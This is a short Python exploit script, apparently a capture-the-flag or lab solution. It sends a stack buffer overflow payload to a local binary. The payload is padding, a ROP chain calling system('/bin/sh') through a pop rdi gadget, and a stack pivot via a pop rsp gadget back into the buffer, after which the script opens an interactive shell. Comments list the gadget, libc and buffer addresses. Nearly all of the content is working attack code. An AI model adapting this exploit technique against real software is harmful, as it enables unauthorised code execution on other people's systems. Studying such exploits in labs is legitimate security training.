import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('chain:'))

ropchain = p64(0x00000000004007e3)+p64(0x7f00003b4d57)+p64(0x7f000026d390)
payload = "B"*24+ropchain+"A"*24+p64(0x00000000004007dd)+p64(0x7fffffffed30)
p.sendline(payload)
p.interactive() 

# system = 0x7f000026d390
# /bin/sh at 0x7f00003b4d57
# 0x00000000004007e3 : pop rdi ; ret
# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# buffer starts at 0x7fffffffed30 i.e. rbp-0x40
